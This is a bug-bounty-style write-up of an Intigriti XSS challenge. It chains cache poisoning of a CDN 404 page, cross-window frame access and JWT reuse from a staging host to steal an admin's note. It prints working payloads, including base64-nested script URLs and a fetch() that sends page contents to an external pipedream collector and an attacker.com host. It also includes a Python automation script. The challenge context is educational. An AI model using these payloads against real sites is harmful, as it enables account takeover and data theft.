Intigriti has been putting amazing xss challenges lately,I have been having a hard time in completely solving them but stil I am able to learn a lot from this challenges thanks to the author escpecially.

This month was no exception, this month's xss challenge was created by @H4R3L (he found a very interesting xss bug in glassdoor  https://nokline.github.io/bugbounty/2022/09/02/Glassdoor-Cache-Poisoning.html) make sure to read if you haven't already.

https://twitter.com/intigriti/status/1597209905903149060?s=20&t=G9vZKRi4jTgnJPB_JetsfQ

The challenge type was a bit different then you normally see in other intigriti xss challenge.


Here's the solution video: https://twitter.com/intigriti/status/1599556700901720066?s=20&t=cLISRgUqpEVoOlFY5thZrA

I didn't completed this challenge  the last part I wasn't able to solve how (avatar path),so my writeup is based on the video solution for that part only. 

```
Rules:
This challenge runs from the 28th of November until the 4th of December, 11:59 PM CET.
Out of all correct submissions, we will draw six winners on Monday, the 5th of December:
Three randomly drawn correct submissions
Three best write-ups
Every winner gets a €50 swag voucher for our swag shop
The winners will be announced on our Twitter profile.
For every 100 likes, we'll add a tip to announcement tweet.
Join our Discord to discuss the challenge!
```

```
The solution...
Should steal the flag from the admin user. The admin user has a note with more info on the flag.
The flag format is INTIGRITI{.*}.
Should NOT use another challenge on the intigriti.io domain.
Should be reported at go.intigriti.com/submit-solution.
```

The task of this challenge is to steal the flag from the admin user, the challenge site is basically a note taking application so the flag is in admin's note.


*Test your payloads down below and on the challenge page here! Think you have the right solution? Send your payload to "https://api.challenge-1122.intigriti.io/admin?url=" to have an admin check it immediately! Do not spam this endpoint. Doing so will result in a ban.*


Any url provided to this endpoint will be visited by the admin user (such challenges ae pretty common in ctfs, where you need to find a xss bug and then steal something from the admin's acc)
https://api.challenge-1122.intigriti.io/admin?url=

-----------------------------------------------------------


The signup page 
![firefox_5pIzYwQemJ](https://user-images.githubusercontent.com/31372554/205580721-fcae8e54-ef3a-4520-85fe-d111ff5c2fa1.png)


The username is automatically filled which is randomly generated using output from fakerjs
Just hit on signup and login to view other section of the website

![firefox_kLgOmNT4g4](https://user-images.githubusercontent.com/31372554/205580702-ef9a4ee1-855d-4cea-9e77-cb8557d231dc.png)



The authentication is based upon jwt.





On the left corner you can see there options to create  a new note


![firefox_6juWcTQMYB](https://user-images.githubusercontent.com/31372554/205580682-3b4aa73d-1e6d-4c7a-8bf6-6402e1614b00.png)

Hitting on submit button will create the note.

```
POST /api/notes HTTP/2
Host: api.challenge-1122.intigriti.io
Cookie: _ga=GA1.2.2123064541.1629122479
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://api.challenge-1122.intigriti.io/
Content-Type: application/json
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiZDIyMzExMTMtNDBmNy00ZmQzLTlmZjctN2JlNTAzMTFiNWQyIiwidXNlcm5hbWUiOiJibHVldG9vdGgtamF6ejk0Nzk2MzU0IiwiaWF0IjoxNjcwMjE3Nzc2LCJleHAiOjE2NzAzMDQxNzZ9.Cd37krh_2ntj0YXD2z4LqeX578G5f5DD7F_z0SqssqA
Content-Length: 56
Origin: https://api.challenge-1122.intigriti.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

{
  "title": "xxx\"><img src=x>",
  "note": "xxx\"><img src=x>"
}
```

Response
```json
{
  "success": true,
  "reference": "https://cdn.challenge-1122.intigriti.io/uploads/note-bluetooth-jazz94796354-13b9aa3a-dee8-4811-bfd5-2e71fda297c1.html",
  "uuid": "13b9aa3a-dee8-4811-bfd5-2e71fda297c1",
  "owner": "bluetooth-jazz94796354",
  "title": "xxx\"&gt;"
}
```

I will explain later what the `reference` parameter url is used for.


The note title and content appears something like this on the page, the html tags didn't get rendered so that means there was some sanitization in place or something.

![firefox_GbRqONtTwh](https://user-images.githubusercontent.com/31372554/205580640-1a6cd4a5-4f55-4010-beb0-9d5e03f3d6f7.png)



As we now have a basic understanding of the application let's focus on the api endpoints and js code.

![firefox_Lv4JNvsLe4](https://user-images.githubusercontent.com/31372554/205580620-c55c30a0-033b-4da4-8727-2f3615989e8d.png)

The note contents are actually stored in .html file in a different subdomain cdn.challenge-1122.intigriti.io, from the `/api/notes` endpoint response the `reference` key denotes the location where the note contents were saved.

If you visit this url, you can view the note content:

https://cdn.challenge-1122.intigriti.io/uploads/note-bluetooth-jazz94796354-13b9aa3a-dee8-4811-bfd5-2e71fda297c1.html

The note content is properly seems to santized , this note cdn url is embedded in an iframe on the main site as you can see in the above screenshot and highlighted areas.



------------

# JS code

Looking at the js code now:

```js
if(document.domain == "staging.challenge-1122.intigriti.io"){ // [1]
        		alert("You are in the staging environment")
        	}

        	function addNote(uuid, title, reference){
        		let note_list_content = document.getElementById("note-list-content")
        		let note_list = document.getElementById("note-list")

				let h3title = document.createElement("h3")
				h3title.textContent = title // [2]

				let frame = document.createElement("iframe")
				frame.src = reference  // [3]
				
				let div = document.createElement("div")
				div.id = uuid
				div.classList = "tabcontent"
				div.appendChild(h3title)
				div.appendChild(frame)
        		
        		let a = document.createElement("a")
        		a.onclick = () => getNote(uuid)
        		a.classList = "tablinks list-group-item bg-dark text-white list-group-item-action list-group-item-light p-3"
        		a.text = `[*] ${title}`

        		note_list_content.appendChild(div)
        		note_list.appendChild(a)
        		
        	}
        	
        	
	        let jwt = localStorage['jwt'];
	        if(!jwt){
	        	location = '/signup'
	        } else{
	        	fetch("/api/user/me", { 
	        		headers: {
	        			'Authorization': `Bearer ${jwt}`
	        		} 
	        	})
	        	.then(r => r.json())
	        	.then(r => {
	        		if(!r.success){
	        			location = '/signup'
	        		} else {
	        			const username = r.username
	        			const avatarPath = r.avatarPath
	        			document.getElementsByClassName("username")[0].innerText = username;
	        			if(avatarPath){
	        				document.getElementsByClassName("avatar")[0].src = avatarPath;
	        			}
	        		}
	        		
	        	})
	        }
	        fetch("/api/notes", {
	        	headers: {
	        		'Authorization': `Bearer ${jwt}`,
	        		'Accept': 'application/json'
	        	}
	        })
	        .then(r => r.json())
	        .then(r => {
	        	if(!r){
	        		return alert("Something went wrong")
	        	}
	        	r.forEach((n)=>{
	        		let { title, uuid, reference } = n
	        		addNote(uuid,title,reference)
	        	})
	        })
```

From line [1], we got to know about another subdomain staging.challenge-1122.intigriti.io. After that there is a method `addNote` which as the name suggests adds the note to the pages dom.
On line [2], the note's title is passed to the `h3title.textContent` (if it would have been innerHTML then xss would have been there but this is safe from xss)
On line [3] you can it directly puts the `refrence` key in the iframe src attribute which I have already shown in the screenshot.





```js
	let file_upload = document.getElementsByClassName("file-upload")[0]
		file_upload.addEventListener('change', (e)=>{
			let formData = new FormData();
			formData.append("avatar", file_upload.files[0]);
			fetch("/api/user/avatar", {
				method: "POST",
				headers: { 
					'Accept': 'application/json', 
					'Authorization': `Bearer ${jwt}` 
				},
				body: formData
			})
			.then(r=>r.json())
			.then(r => {
				let avatar = document.getElementsByClassName("avatar")[0]
				avatar.src = r.avatarPath; 
			})
		})
		
		let note_submit = document.getElementById("note-submit");
		function submitNote() { 
			let title = document.getElementById("note-title").value; 
			let note = document.getElementById("note-body").value; 
			fetch("/api/notes", { 
				method: "POST", 
				headers: { 
					'Accept': 'application/json', 
					'Content-Type': 'application/json', 
					'Authorization': `Bearer ${jwt}` 

				}, 
				body: JSON.stringify({ 
					title: title, 
					note: note 
				}) 
			}) 
			.then(r => r.json()) 
			.then(r => { 
				if(!r || !r.success){
					return alert("Something went wrong")
				}
				addNote(r.uuid, r.title, r.reference)
			}) 
		}
```

From this part of the code we come to realize that there is a file upload funcionality , you can change your avatar by clicking on your profile icon.

![firefox_2cCxmcYzSS](https://user-images.githubusercontent.com/31372554/205580580-85fbb816-d0c6-49f0-bce7-c7a7411b5006.png)


The avatar is also uploaded on the cdn domain,eg url https://cdn.challenge-1122.intigriti.io/uploads/avatar-bluetooth-jazz94796354.png


```
POST /api/user/avatar HTTP/2
Host: api.challenge-1122.intigriti.io
Cookie: _ga=GA1.2.2123064541.1629122479
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:107.0) Gecko/20100101 Firefox/107.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://api.challenge-1122.intigriti.io/
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiZDIyMzExMTMtNDBmNy00ZmQzLTlmZjctN2JlNTAzMTFiNWQyIiwidXNlcm5hbWUiOiJibHVldG9vdGgtamF6ejk0Nzk2MzU0IiwiaWF0IjoxNjcwMjE3Nzc2LCJleHAiOjE2NzAzMDQxNzZ9.Cd37krh_2ntj0YXD2z4LqeX578G5f5DD7F_z0SqssqA
Content-Type: multipart/form-data; boundary=---------------------------1514786326898924171509647265
Content-Length: 7329
Origin: https://api.challenge-1122.intigriti.io
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

-----------------------------1514786326898924171509647265
Content-Disposition: form-data; name="avatar"; filename="3r5bLuud.png"
Content-Type: image/png

test<img src=x>
-----------------------------1514786326898924171509647265--

```

The validation is pretty relax so it accepts any extenions, leave the `Content-Type: image/png` as it is or else it will return image not valid error.

By changing the `filename` parameter to `html` we can achieve xss here (that's what I though at first)

```
-----------------------------1514786326898924171509647265
Content-Disposition: form-data; name="avatar"; filename="test.html"
Content-Type: image/png

test<img src=x onerror=alert()>
-----------------------------1514786326898924171509647265--
```

Response:

```json
{
  "success": true,
  "avatarPath": "https://cdn.challenge-1122.intigriti.io/uploads/avatar-bluetooth-jazz94796354.html"
}
```

Visiting the `avatarPath` url https://cdn.challenge-1122.intigriti.io/uploads/avatar-bluetooth-jazz94796354.html
Renderes the image tag but no xss popup :(


CSP Violation..
![firefox_RI5d7MZIzl](https://user-images.githubusercontent.com/31372554/205580557-46c70adf-c555-4a35-a31b-8bcd193c615b.png)




Checking the csp on https://csp-evaluator.withgoogle.com/ , yield no findings . The policy pretty strict so no xss
![firefox_VZkOZr7Pym](https://user-images.githubusercontent.com/31372554/205580541-eb11c62a-9a10-4ca0-89ab-8704d8c9d8ad.png)


-------------------

# 404 Not found Page

If you visit a url on the /upload endpoint which doesn't exists it returns a custom 404 page which looks old

https://cdn.challenge-1122.intigriti.io/uploads/testxxxxxxxxxxxxxxxxxxxxxxx.html

![BurpSuiteCommunity_fvjnFj2EES](https://user-images.githubusercontent.com/31372554/205580525-a024e516-1daa-43ff-9fe0-85806a3460cd.png)

IN no time you can spot as the path is being reflected in the response without any santization this leads to xss, along with that no csp is there in this endpoint :)
But no visiting this endpoint in browser didn't showed any popup, the path was url encoded in the response page.

![firefox_AlvE2aik6a](https://user-images.githubusercontent.com/31372554/205580509-29dc5959-b6df-49b9-9931-0349d156523a.png)


This xss is the one which only works in Internet Explorer, all other browsers url encode the path IE is the exception, this really looks like self xss currently like from burp *Show response in browser* which is not any usefull any where.


Focusing more on the response headers of the 404 page

```
HTTP/2 200 OK
Date: Mon, 05 Dec 2022 05:49:10 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
Etag: W/"67-llkugSXLZIgZRBq03M5e+T6gfZE"
X-Varnish: 6525264
Age: 0
Via: 1.1 varnish (Varnish/6.1)
X-Cache: MISS
X-Cache-Hits: 0
```

It seemed caching is enabled for this endpoint, I spent so much time here the `X-Cache`  header value never changed to `HIT` no matter what extension I try.
Turns out in the *Param Miner* config both the cache buster were enabled,

![BurpSuiteCommunity_01BCvE076W](https://user-images.githubusercontent.com/31372554/205580496-e64a273d-48c1-40e9-a6a1-146a775b93e6.png)


And I was only focused on the `X-Cache`  header and didn;t saw that a new parameter was added to the url which avoided the page to get cached(as everytime a new cachebuster was added to the url).
Disabled  those options and now got the change in response header.

```
https://cdn.challenge-1122.intigriti.io/uploads/testxxxxxxxxxxxxxxxxxxxxxxx.png



HTTP/2 200 OK
Date: Mon, 05 Dec 2022 05:59:43 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
Etag: W/"4d-KAcasjxe3gWO1IO7lrWp05LJXyY"
X-Varnish: 665576 3848761
Age: 1
Via: 1.1 varnish (Varnish/6.1)
X-Cache: HIT
X-Cache-Hits: 3

<h1>404 :(</h1><p>Could not find /uploads/testxxxxxxxxxxxxxxxxxxxxxxx.png</p>
```

Adding any character after the extension part reult into the page not being cache, so inserted the xss payload in the filename path

ALthough I could put any tags inside it, I can't use `/` neither space which are really necessary in this case



This url returned the express not found page not the custom 404 page so no xss

https://cdn.challenge-1122.intigriti.io/uploads/xxx<img/src=x>shirley.png

```
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Cannot GET /uploads/xxx%3Cimg/src=x%3Eshirley.png</pre>
</body>
</html>

```

Even if I used encoded values like %2F %20, they will not be auto decode by the browser so again no xss. 



It's only possible use those restricted characters in the query parameters, so I played around a bit.Btw I was talking to author giving updates about my progress this really helps , the author might no give you hints but still it really helps so don't hesitate to reach out the author of such challenges they are really nice and open to answer any question you have regarding the challenges.
I told the author that I can't use those characters which are really needed for xss and that would be only after `?`, he replied *How does the server actually checks to cache the page or not*

Then spent time to think about it, all it does it checks for the url if it ends with allowlist extension or not like .jpg,.png,.css

After playing around a bit I found the work around this:

https://cdn.challenge-1122.intigriti.io/uploads/xxx?<img/src=x>shirley.png

```
HTTP/2 200 OK
Date: Mon, 05 Dec 2022 06:26:12 GMT
Content-Type: text/html; charset=utf-8
X-Powered-By: Express
Etag: W/"48-MDC+d7XBSsp/uSACZQJwS1l34n4"
X-Varnish: 665644 665642
Age: 3
Via: 1.1 varnish (Varnish/6.1)
X-Cache: HIT
X-Cache-Hits: 1

<h1>404 :(</h1><p>Could not find /uploads/xxx?<img/src=x>shirley.png</p>
```

Make a request to this url 2-3 times so that it's being cached: https://cdn.challenge-1122.intigriti.io/uploads/xxx?<img/src='x'/onerror=alert()>shirley.png

![firefox_BJNya2NGOr](https://user-images.githubusercontent.com/31372554/205580466-a5960309-e47c-4c24-b235-7e08f2d84fd5.png)

Finally xsss



-------------------------------------

# Stealing admin's note

My solution is different from the original solution explained in the solution video, instead of serviceWorkers I used window.open method.

The main challenge site is not frameable due to the csp `frame-ancestors challenge-1122.intigriti.io`



*If you have an iframe inside an iframe from a cross origin request, the top frame can change the iframe of the other origin*

Suppose abc.com has an iframe def.com and the domain abc.com can be framed by any other domain, then ghi.com domain can change the abc.com child iframe def.com location to somewhere else by framing the abc.com domain.


AS the main challenge site api.challenge-1122.intigriti.io can't be framed because of csp I used window.open.

```js
x = window.open("http://api.challenge-1122.intigriti.io")
x.frames[0].location = "http://evil.com"
```

![firefox_6otWGBGVos](https://user-images.githubusercontent.com/31372554/205580425-cd995371-1e8a-4b2d-a712-a81386b0bbf0.png)

![firefox_nhlOftP5hc](https://user-images.githubusercontent.com/31372554/205580409-0b39314a-b258-463d-8fd3-f141a2f723cb.png)



Cool I had this idea in my mind as the above scenario was working, the notes are saved in cdn.challenge-1122.intigriti.io and I have xss on cdn.challenge-1122.intigriti.io as both are same origin I should be able to full control it (access the dom properties,etc)


If I change the `x.frames[0].location` to the url which has xss payload and then read the previous url (which contains the note content) I would be able to solve this challenge.

If there was one more note in the admin's account I could have do something like:

suppose the flag is in the first note so I modified the 2nd iframe url only.

```js
x = window.open("http://api.challenge-1122.intigriti.io")
x.frames[1].location = "https://cdn.challenge-1122.intigriti.io/uploads/xxx?<img/src='x'/onerror=stealIframe1COntent()>shirley.png"


//stealIframe1COntent can be

fetch("attacker.com/?x="+x.frames[0].document.baseURI) 
``` 

But as there was only iframe I thought what else I can do, I searched on google about how to read the previous url but all of them were telling about history.back() none of them were about being able to read the previous url.
So I came up with solution of mine

-----------------------------------------------

# Read previous url

```
https://cdn.challenge-1122.intigriti.io/uploads/xxxx?<script>eval(atob("ZnVuY3Rpb24gdGVzdCgpeyAKCXguZnJhbWVzWzBdLmxvY2F0aW9uID0gImh0dHBzOi8vY2RuLmNoYWxsZW5nZS0xMTIyLmludGlncml0aS5pby91cGxvYWRzL3h4eHg/PHNjcmlwdD53aW5kb3cub3BlbihhdG9iKGBhSFIwY0hNNkx5OWpaRzR1WTJoaGJHeGxibWRsTFRFeE1qSXVhVzUwYVdkeWFYUnBMbWx2TDNWd2JHOWhaSE12ZUhoNGVEODhjMk55YVhCMFBuTmxkRlJwYldWdmRYUW9abVYwWTJnb0ltaDBkSEJ6T2k4dlpXNHlZMlZzY2pkeVpYZGlkV3d1YlM1d2FYQmxaSEpsWVcwdWJtVjBMejk0UFNJcmQybHVaRzkzTG05d1pXNWxjaTVrYjJOMWJXVnVkQzVpYjJSNUxtbHVibVZ5U0ZSTlRDa3NNakF3TUNrN1BDOXpZM0pwY0hRK0xtcHdaM011Y0c1bmApKTtoaXN0b3J5LmJhY2soKTs8L3NjcmlwdD4uanBnc3MucG5nIgp9Owp4ID0gd2luZG93Lm9wZW4oImh0dHBzOi8vYXBpLmNoYWxsZW5nZS0xMTIyLmludGlncml0aS5pbyIpOwpzZXRUaW1lb3V0KHRlc3QsNTAwMCk7"))</script>.jpgs.png
```

Decoding the base64 payload you will get:

```js
function test(){ 
	x.frames[0].location = "https://cdn.challenge-1122.intigriti.io/uploads/xxxx?<script>window.open(atob(`aHR0cHM6Ly9jZG4uY2hhbGxlbmdlLTExMjIuaW50aWdyaXRpLmlvL3VwbG9hZHMveHh4eD88c2NyaXB0PnNldFRpbWVvdXQoZmV0Y2goImh0dHBzOi8vZW4yY2VscjdyZXdidWwubS5waXBlZHJlYW0ubmV0Lz94PSIrd2luZG93Lm9wZW5lci5kb2N1bWVudC5ib2R5LmlubmVySFRNTCksMjAwMCk7PC9zY3JpcHQ+LmpwZ3MucG5n`));history.back();</script>.jpgss.png"
};
x = window.open("https://api.challenge-1122.intigriti.io");
setTimeout(test,3000);
```

It basically opens the challenge site using window.open then changes the iframe location to another xss payload url, decoding it:



```js
<script>

window.open(atob(`aHR0cHM6Ly9jZG4uY2hhbGxlbmdlLTExMjIuaW50aWdyaXRpLmlvL3VwbG9hZHMveHh4eD88c2NyaXB0PnNldFRpbWVvdXQoZmV0Y2goImh0dHBzOi8vZW4yY2VscjdyZXdidWwubS5waXBlZHJlYW0ubmV0Lz94PSIrd2luZG93Lm9wZW5lci5kb2N1bWVudC5ib2R5LmlubmVySFRNTCksMjAwMCk7PC9zY3JpcHQ+LmpwZ3MucG5n`));

history.back();
</script>
```

Now the iframe has this payload in it, it opens a new url with `window.open` again (this url points to another url with xss payload in it) and then it calls the method `history.back()`  (this will change the iframe location to the previous one)
The previous url is where the admin's note is stored.


This is the url which was opened, the final xss payload url::

```
https://cdn.challenge-1122.intigriti.io/uploads/xxxx?<script>setTimeout(fetch("https://en2celr7rewbul.m.pipedream.net/?x="+window.opener.document.body.innerHTML),2000);</script>.jpgs.png
```


```html
<script>
setTimeout(fetch("https://en2celr7rewbul.m.pipedream.net/?x="+window.opener.document.body.innerHTML),2000);
</script>
```

`window.opener.document.body.innerHTML` this sends the note contents to our server (we can change it to document.baseURI, to get the whole url also)


I also made python script to do all this :

```python
import base64
import requests
import time
import random
import string
import os


random_alphanum = ''.join(random.choices(string.ascii_uppercase + string.digits, k=5))


sPayload3 = """setTimeout(fetch("https://en2celr7rewbul.m.pipedream.net/?x="+window.opener.document.body.innerHTML),5000);"""

url3 = "https://cdn.challenge-1122.intigriti.io/uploads/xxxx{}?<script>{}</script>.jpgs.png".format(random_alphanum,sPayload3)

# Encode the URL in base64 format
encoded_url3 = base64.b64encode(url3.encode("utf-8"))

# Print the encoded URL
payload3 = str(encoded_url3,'UTF-8')

# generate random alphanum length 5

sPayload2 = """window.open(atob(`{}`));history.back();""".format(payload3)

url2 = "https://cdn.challenge-1122.intigriti.io/uploads/xxxx{}?<script>{}</script>.jpgss.png".format(random_alphanum,sPayload2)


finalPayload = """
function test(){{ 
	x.frames[0].location = "{}"
}};
x = window.open("https://api.challenge-1122.intigriti.io");
setTimeout(test,1000);
""".format(url2)

# Encode the finalPayload in base64 format

encoded_finalPayload = str(base64.b64encode(finalPayload.encode("utf-8")), 'UTF-8')


url = "https://cdn.challenge-1122.intigriti.io/uploads/xxxx{}?<script>eval(atob(`{}`))</script>.jpgsss.png".format(random_alphanum,encoded_finalPayload)

print(url)


os.system("curl --path-as-is -X GET '{}'".format(url))
os.system("curl --path-as-is -X GET '{}'".format(url))

os.system("curl --path-as-is -X GET '{}'".format(url2))
os.system("curl --path-as-is -X GET '{}'".format(url2))
os.system("curl --path-as-is -X GET '{}'".format(url2))

os.system("curl --path-as-is -X GET '{}'".format(url3))
os.system("curl --path-as-is -X GET '{}'".format(url3))

print("[+] Submitting the url to bot:")
u  = os.system("curl --path-as-is -X GET 'https://api.challenge-1122.intigriti.io/admin?url={}'".format(url))

#make get request to the url every 1sec
while True:
    x = os.system("curl --path-as-is -X GET '{}' -s".format(url))
    #print response header
    #print(x.headers)
    y = os.system("curl --path-as-is -X GET '{}' -s".format(url2))
    #print(y.headers)
    z = os.system("curl --path-as-is -X GET '{}' -s".format(url3))
    #print(z.headers)
    time.sleep(1)
```

script video poc:

{}





When I started writing this writeup I realised I fucking stupid I am all the above things I did weren't required at all.
I could have simply used this poc:


Instead of changing the location I can simply read it

```js
x = window.open("https://api.challenge-1122.intigriti.io");
setTimeout(alert(x.frames[0].document.baseURI),5000);  
```

Once you have the note url you can view the message that the flag is actualli the admin's avatar.
To find the admin's avatar url , you need to take the username from the notes url and then register using the same on staging subdomain this will give a jwt token , use the same token on the main api subdomain and then you can access the admin acc easily (basically ato)
